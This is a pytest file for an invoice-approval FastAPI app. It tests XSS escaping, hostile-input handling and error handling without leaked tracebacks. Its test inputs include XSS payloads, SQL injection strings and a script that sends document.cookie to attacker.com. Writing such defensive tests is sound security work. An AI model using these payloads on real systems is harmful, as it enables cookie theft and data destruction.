"""Tests for Phase 10: Application security, input sanitization, and XSS prevention."""

import pytest
from fastapi.testclient import TestClient

from app.api.main import app
from app.api.static_ui import UI_HTML


@pytest.fixture
def client():
    return TestClient(app)


def test_static_ui_contains_strict_xss_escaping():
    """UI_HTML must define escapeHtml and apply it to dynamic render surfaces."""
    # 1. escapeHtml helper function must be present
    assert "function escapeHtml(str)" in UI_HTML
    assert "[&<\"']" in UI_HTML or "replace(" in UI_HTML

    # 2. Rendering functions must invoke escapeHtml
    assert "escapeHtml(inv.vendor_name)" in UI_HTML
    assert "escapeHtml(inv.invoice_number)" in UI_HTML
    assert "escapeHtml(statusLabel)" in UI_HTML
    assert "escapeHtml(block.action)" in UI_HTML


def test_converse_api_safe_with_xss_prompt(client):
    """Converse API must safely handle raw script and HTML injection payloads."""
    xss_payload = "<script>alert('XSS-EXPLOIT');</script><img src='x' onerror='alert(1)'>"
    resp = client.post("/api/alexa/converse", json={"prompt": xss_payload})
    assert resp.status_code == 200
    data = resp.json()
    assert "voice_speech" in data
    # Ensure system does not crash or execute code
    assert data["intent"] in ["SPECIFICATION_REQUIRED", "BATCH_AUDIT_SUMMARY", "TRANSACTION_NOT_FOUND"]


def test_action_api_safe_with_hostile_notes(client):
    """Action endpoint must safely record hostile notes in audit metadata without injection."""
    hostile_notes = "<svg onload=alert(document.cookie)>' OR '1'='1"
    resp = client.post(
        "/api/alexa/action",
        json={
            "invoice_id": "INV-2026-101",
            "action": "APPROVE_AND_SEAL",
            "notes": hostile_notes,
        },
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["invoice_id"] == "INV-2026-101"
    assert data["new_status"] == "APPROVED_AND_SEALED"
    # Verify hostile notes were safely stored in audit metadata
    assert data["audit_block"]["metadata"]["notes"] == hostile_notes


def test_tamper_test_handles_hostile_strings(client):
    """Tamper simulation endpoint safely accepts hostile payloads without executing or crashing."""
    resp = client.post(
        "/api/alexa/tamper-test",
        json={
            "invoice_id": "INV-2026-103",
            "tampered_amount": "999999.99' DROP TABLE invoices;--",
            "tampered_recipient": "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
        },
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["tamper_detected"] is True
    assert data["invoice_id"] == "INV-2026-103"


def test_malformed_json_and_payload_error_handling(client):
    """Malformed requests must return clean 422 validation errors without leaking server stack traces."""
    # Missing required 'action' field
    resp = client.post("/api/alexa/action", json={"invoice_id": "INV-2026-101"})
    assert resp.status_code == 422
    data = resp.json()
    assert "detail" in data or "message" in data or "error" in data
    # Ensure raw Python traceback is not leaked to client
    assert "Traceback (most recent call last)" not in resp.text
